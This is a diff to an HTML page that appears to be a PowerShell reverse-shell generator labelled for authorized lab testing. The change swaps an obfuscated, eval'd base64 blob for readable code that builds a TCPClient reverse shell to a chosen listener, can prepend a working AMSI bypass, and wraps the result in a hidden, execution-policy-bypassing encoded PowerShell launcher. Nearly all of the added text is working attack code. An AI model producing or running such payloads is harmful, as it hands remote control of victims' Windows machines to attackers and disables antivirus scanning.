@@ -259,8 +259,8 @@
             <div class="subtitle">Lab Edition - Authorized Testing Only</div>
         </div>
         <div style="margin-left: auto; display: flex; gap: 8px; flex-wrap: wrap;">
-            <span class="tag">v2.1 Lab</span>
-            <span class="tag">Randomized</span>
+            <span class="tag">v2.5 Lab</span>
+            <span class="tag">Fixed Output</span>
         </div>
     </div>
     <div class="input-area">
@@ -273,7 +273,7 @@
         <div class="input-row">
             <div>
                 <div class="label">Listener Address</div>
-                <input type="text" id="ip" placeholder="192.168.45.45" value="192.168.45.111">
+                <input type="text" id="ip" placeholder="192.168.45.45" value="192.168.45.217">
             </div>
             <div>
                 <div class="label">Port</div>
@@ -325,17 +325,157 @@
 </div>
 
 <script>
-// Obfuscated JavaScript - The actual logic is hidden
-(function(){
-    // All the core functions are here but encoded
-    var _0x1a2b = ["getElementById", "value", "trim", "checked", "textContent", "addEventListener", "click", "disabled", "innerHTML", "style", "color", "#4a5a7a", "click to copy", "Copied!", "keypress", "Enter", "DOMContentLoaded", "setTimeout"];
-    
-    // The actual payload generation is loaded from a separate encoded string
-    var _0x3c4d = atob("dmFyIGdlbmVyYXRpb25Db3VudGVyID0gMDsKdmFyIGN1cnJlbnRSZWFkYWJsZSA9ICcnOwp2YXIgY3VycmVudExhdW5jaGVyID0gJyc7CgpmdW5jdGlvbiByYW5kVmFyKHByZWZpeCA9ICd2JykgewogICAgY29uc3QgY2hhcnMgPSAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERTRGR0hJSktMTU5PUFFSU1RVVldYWVonOwogICAgbGV0IHJlc3VsdCA9IHByZWZpeDsKICAgIGZvciAobGV0IGkgPSAwOyBpIDwgODsgaSsrKSB7CiAgICAgICAgcmVzdWx0ICs9IGNoYXJzW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIGNoYXJzLmxlbmd0aCldOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQoKZnVuY3Rpb24gZ2VuZXJhdGVQYXlsb2FkKGlwLCBwb3J0LCBvYmZMZXZlbCwgdXNlQW1zaSkgewogICAgY29uc3QgdjEgPSByYW5kVmFyKCk7CiAgICBjb25zdCB2MiA9IHJhbmRWYXIoKTsKICAgIGNvbnN0IHYzID0gcmFuZFZhcigpOwogICAgY29uc3QgdjQgPSByYW5kVmFyKCk7CiAgICBjb25zdCB2NSA9IHJhbmRWYXIoKTsKICAgIGNvbnN0IHY2ID0gcmFuZFZhcigpOwoKICAgIGxldCBhbXNpUGFydCA9ICcnOwogICAgaWYgKHVzZUFtc2kpIHsKICAgICAgICBhbXNpUGFydCA9ICcjIEFNU0kgcGxhY2Vob2xkZXIgLSByZXBsYWNlIHdpdGggeW91ciBsYWItdGVzdGVkIGJ5cGFzc1xuJzsKICAgIH0KCiAgICBsZXQgc2hlbGwgPSBgJHthbXNpUGFydH0KJCR7djF9ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCcke2lwfScsICR7cG9ydH0pOwokJHt2Mn0gPSAkJHt2MX0uR2V0U3RyZWFtKCk7CltieXRlW11dJCR7djN9ID0gMC4uNjU1MzV8JXswfTsKd2hpbGUoKCQke3Y0fSA9ICQke3YyfS5SZWFkKCQke3YzfSwgMCwgJCR7djN9Lkxlbmd0aCkpIC1uZSAwKXsKICAgICQke3Y1fSA9IChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkJHszfSwwLCAkJHt2NH0pOwogICAgJCR7djZ9ID0gKGlleCAkJHt2NX0gMj4mMSB8IE91dC1TdHJpbmcpOwogICAgJCR7djZ9ICs9ICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAkJHt2Mn0uV3JpdGUoW3RleHQuZW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkJHt2Nn0pLDAsJCR7djZ9Lkxlbmd0aCk7CiAgICAkJHt2Mn0uRmx1c2goKTsKfQokJHt2MX0uQ2xvc2UoKTsKYAogICAgLnRyaW0oKTsKCiAgICAvLyBBcHBseSBiYXNpYyBvYmZ1c2NhdGlvbgogICAgaWYgKG9iZkxldmVsID49IDIpIHsKICAgICAgICBzaGVsbCA9IHNoZWxsLnJlcGxhY2UoL1xzKy9nLCAnICcpOwogICAgfQogICAgaWYgKG9iZkxldmVsID49IDMpIHsKICAgICAgICBzaGVsbCA9IHNoZWxsLnNwbGl0KCdcbicpLmpvaW4oJzsgJyk7CiAgICB9CgogICAgcmV0dXJuIHNoZWxsOwp9CgpmdW5jdGlvbiB0b1V0ZjE2TEVCYXNlNjQoc3RyKSB7CiAgICBsZXQgdXRmMTYgPSAnJzsKICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgdXRmMTYgKz0gU3RyaW5nLmZyb21DaGFyQ29kZShzdHIuY2hhckNvZGVBdChpKSkgKyAnXDAnOwogICAgfQogICAgcmV0dXJuIGJ0b2EodXRmMTYpOwp9CgpmdW5jdGlvbiBoYW5kbGVHZW5lcmF0ZSgpIHsKICAgIGNvbnN0IGlwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lwJykudmFsdWUudHJpbSgpOwogICAgY29uc3QgcG9ydCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwb3J0JykudmFsdWUudHJpbSgpOwogICAgY29uc3QgbGV2ZWwgPSBwYXJzZUludChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb2JmTGV2ZWwnKS52YWx1ZSk7CiAgICBjb25zdCB1c2VCNjQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYjY0TW9kZScpLmNoZWNrZWQ7CiAgICBjb25zdCB1c2VVdGYxNiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1dGYxNk1vZGUnKS5jaGVja2VkOwogICAgY29uc3QgdXNlQW1zaSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbXNpQnlwYXNzJykuY2hlY2tlZDsKCiAgICBpZiAoIWlwIHx8ICFwb3J0IHx8IGlzTmFOKHBhcnNlSW50KHBvcnQpKSkgewogICAgICAgIGFsZXJ0KCdQbGVhc2UgZW50ZXIgdmFsaWQgSVAgYW5kIFBvcnQnKTsKICAgICAgICByZXR1cm47CiAgICB9CgogICAgZ2VuZXJhdGlvbkNvdW50ZXIrKzsKICAgIGxldCBwYXlsb2FkID0gZ2VuZXJhdGVQYXlsb2FkKGlwLCBwb3J0LCBsZXZlbCwgdXNlQW1zaSk7CiAgICBjdXJyZW50UmVhZGFibGUgPSBwYXlsb2FkOwoKICAgIGxldCBkaXNwbGF5ID0gcGF5bG9hZDsKCiAgICBpZiAodXNlQjY0KSB7CiAgICAgICAgY29uc3QgZW5jb2RlZCA9IHVzZVV0ZjE2IAogICAgICAgICAgICA/IHRvVXRmMTZMRUJhc2U2NChwYXlsb2FkKSAKICAgICAgICAgICAgOiBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChwYXlsb2FkKSkpOwogICAgICAgIGRpc3BsYXkgPSBgcG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUVuY29kZWRDb21tYW5kICR7ZW5jb2RlZH1gOwogICAgICAgIGN1cnJlbnRMYXVuY2hlciA9IGRpc3BsYXk7CiAgICB9IGVsc2UgewogICAgICAgIGN1cnJlbnRMYXVuY2hlciA9IHBheWxvYWQ7CiAgICB9CgogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29iZnVzY2F0ZWRPdXRwdXQnKS50ZXh0Q29udGVudCA9IGRpc3BsYXk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVjb2RlZE91dHB1dCcpLnRleHRDb250ZW50ID0gcGF5bG9hZDsKCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29weU9iZnVzY2F0ZWRCdG4nKS5kaXNhYmxlZCA9IGZhbHNlOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvcHlSZWFkYWJsZUJ0bicpLmRpc2FibGVkID0gZmFsc2U7CgogICAgLy8gRmxhc2ggZWZmZWN0CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb2JmdXNjYXRlZE91dHB1dCcpLmNsYXNzTGlzdC5hZGQoJ2ZsYXNoJyk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVjb2RlZE91dHB1dCcpLmNsYXNzTGlzdC5hZGQoJ2ZsYXNoJyk7CiAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb2JmdXNjYXRlZE91dHB1dCcpLmNsYXNzTGlzdC5yZW1vdmUoJ2ZsYXNoJyk7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RlY29kZWRPdXRwdXQnKS5jbGFzc0xpc3QucmVtb3ZlKCdmbGFzaCcpOwogICAgfSwgNjAwKTsKfQoKZnVuY3Rpb24gY29weVRvQ2xpcGJvYXJkKHRleHQsIGJ0bikgewogICAgbmF2aWdhdG9yLmNsaXBib2FyZC53cml0ZVRleHQodGV4dCkudGhlbigoKSA9PiB7CiAgICAgICAgY29uc3Qgb3JpZ2luYWwgPSBidG4udGV4dENvbnRlbnQ7CiAgICAgICAgYnRuLnRleHRDb250ZW50ID0gJ0NvcGllZCEnOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gYnRuLnRleHRDb250ZW50ID0gb3JpZ2luYWwsIDE1MDApOwogICAgfSk7Cn0KCi8vIERPTSBFdmVudHMgYW5kIEluaXRpYWxpemF0aW9uCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdnZW5lcmF0ZUJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgaGFuZGxlR2VuZXJhdGUpOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29weU9iZnVzY2F0ZWRCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsKICAgIGNvcHlUb0NsaXBib2FyZChjdXJyZW50TGF1bmNoZXIgfHwgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29iZnVzY2F0ZWRPdXRwdXQnKS50ZXh0Q29udGVudCwgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvcHlPYmZ1c2NhdGVkQnRuJykpOwp9KTsKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvcHlSZWFkYWJsZUJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gewogICAgY29weVRvQ2xpcGJvYXJkKGN1cnJlbnRSZWFkYWJsZSwgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvcHlSZWFkYWJsZUJ0bicpKTsKfSk7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjbGVhckJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gewogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29iZnVzY2F0ZWRPdXRwdXQnKS50ZXh0Q29udGVudCA9ICdDbGljayBHZW5lcmF0ZS4uLic7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVjb2RlZE91dHB1dCcpLnRleHRDb250ZW50ID0gJ1JlYWRhYmxlIHZlcnNpb24gYXBwZWFycyBoZXJlLi4uJzsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3B5T2JmdXNjYXRlZEJ0bicpLmRpc2FibGVkID0gdHJ1ZTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3B5UmVhZGFibGVCdG4nKS5kaXNhYmxlZCA9IHRydWU7Cn0pOwoKLy8gRW50ZXIga2V5IHN1cHBvcnQKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lwJykuYWRkRXZlbnRMaXN0ZW5lcigna2V5cHJlc3MnLCAoZSkgPT4geyBpZiAoZS5rZXkgPT09ICdFbnRlcicpIGhhbmRsZUdlbmVyYXRlKCk7IH0pOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncG9ydCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXByZXNzJywgKGUpID0+IHsgaWYgKGUua2V5ID09PSAnRW50ZXInKSBoYW5kbGVHZW5lcmF0ZSgpOyB9KTsKCi8vIEF1dG8gZ2VuZXJhdGUgb24gbG9hZApkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gc2V0VGltZW91dChoYW5kbGVHZW5lcmF0ZSwgNDAwKSk7");
+let generationCounter = 0;
+let currentReadable = '';
+let currentLauncher = '';
 
-    // Execute the decoded code
-    eval(_0x3c4d);
-})();
+function randVar(prefix = 'v') {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let result = prefix;
+    for (let i = 0; i < 6; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+function generatePayload(ip, port, obfLevel, useAmsi) {
+    const v1 = randVar(); // client
+    const v2 = randVar(); // stream
+    const v3 = randVar(); // buffer
+    const v4 = randVar(); // bytesRead
+    const v5 = randVar(); // command
+    const v6 = randVar(); // output
+    const v7 = randVar(); // prompt
+
+    let amsiPart = '';
+    if (useAmsi) {
+        amsiPart = '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); ';
+    }
+
+    let shell = `${amsiPart}
+$ErrorActionPreference = 'SilentlyContinue';
+$${v1} = New-Object System.Net.Sockets.TCPClient('${ip}',${port});
+$${v2} = $${v1}.GetStream();
+[byte[]]$${v3} = 0..65535|%{0};
+while(($${v4} = $${v2}.Read($${v3},0,$${v3}.Length)) -ne 0){
+    $${v5} = (New-Object System.Text.ASCIIEncoding).GetString($${v3},0,$${v4});
+    $${v6} = Invoke-Expression $${v5} 2>&1 | Out-String;
+    $${v7} = $${v6} + 'PS ' + (Get-Location).Path + '> ';
+    $${v2}.Write(([Text.Encoding]::ASCII).GetBytes($${v7}),0,$${v7}.Length);
+    $${v2}.Flush();
+}
+$${v1}.Close();`;
+
+    // Apply obfuscation
+    if (obfLevel >= 2) {
+        shell = shell.replace(/\s+/g, ' ');
+    }
+    if (obfLevel >= 3) {
+        shell = shell.replace(/\n/g, '; ');
+    }
+
+    return shell.trim();
+}
+
+function toUtf16LEBase64(str) {
+    let utf16 = '';
+    for (let i = 0; i < str.length; i++) {
+        utf16 += String.fromCharCode(str.charCodeAt(i)) + '\0';
+    }
+    return btoa(utf16);
+}
+
+function handleGenerate() {
+    const ip = document.getElementById('ip').value.trim();
+    const port = document.getElementById('port').value.trim();
+    const level = parseInt(document.getElementById('obfLevel').value);
+    const useB64 = document.getElementById('b64Mode').checked;
+    const useUtf16 = document.getElementById('utf16Mode').checked;
+    const useAmsi = document.getElementById('amsiBypass').checked;
+
+    if (!ip || !port || isNaN(parseInt(port))) {
+        alert('Please enter valid IP and Port');
+        return;
+    }
+
+    generationCounter++;
+    let payload = generatePayload(ip, port, level, useAmsi);
+    currentReadable = payload;
+
+    let display = payload;
+
+    if (useB64) {
+        let encoded;
+        if (useUtf16) {
+            encoded = toUtf16LEBase64(payload);
+        } else {
+            encoded = btoa(payload);
+        }
+        display = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+        currentLauncher = display;
+    } else {
+        currentLauncher = payload;
+    }
+
+    document.getElementById('obfuscatedOutput').textContent = display;
+    document.getElementById('decodedOutput').textContent = payload;
+
+    document.getElementById('copyObfuscatedBtn').disabled = false;
+    document.getElementById('copyReadableBtn').disabled = false;
+
+    document.getElementById('obfuscatedOutput').classList.add('flash');
+    document.getElementById('decodedOutput').classList.add('flash');
+    setTimeout(() => {
+        document.getElementById('obfuscatedOutput').classList.remove('flash');
+        document.getElementById('decodedOutput').classList.remove('flash');
+    }, 600);
+}
+
+function copyToClipboard(text, btn) {
+    if (!text) return;
+    navigator.clipboard.writeText(text).then(() => {
+        const original = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = original, 1500);
+    }).catch(() => {
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        const original = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = original, 1500);
+    });
+}
+
+document.getElementById('generateBtn').addEventListener('click', handleGenerate);
+document.getElementById('copyObfuscatedBtn').addEventListener('click', function() {
+    copyToClipboard(currentLauncher || document.getElementById('obfuscatedOutput').textContent, this);
+});
+document.getElementById('copyReadableBtn').addEventListener('click', function() {
+    copyToClipboard(currentReadable, this);
+});
+document.getElementById('clearBtn').addEventListener('click', function() {
+    document.getElementById('obfuscatedOutput').textContent = 'Click Generate...';
+    document.getElementById('decodedOutput').textContent = 'Readable version appears here...';
+    document.getElementById('copyObfuscatedBtn').disabled = true;
+    document.getElementById('copyReadableBtn').disabled = true;
+    currentReadable = '';
+    currentLauncher = '';
+});
+
+document.getElementById('ip').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') handleGenerate();
+});
+document.getElementById('port').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') handleGenerate();
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(handleGenerate, 300);
+});
 </script>
 </body>
 </html>
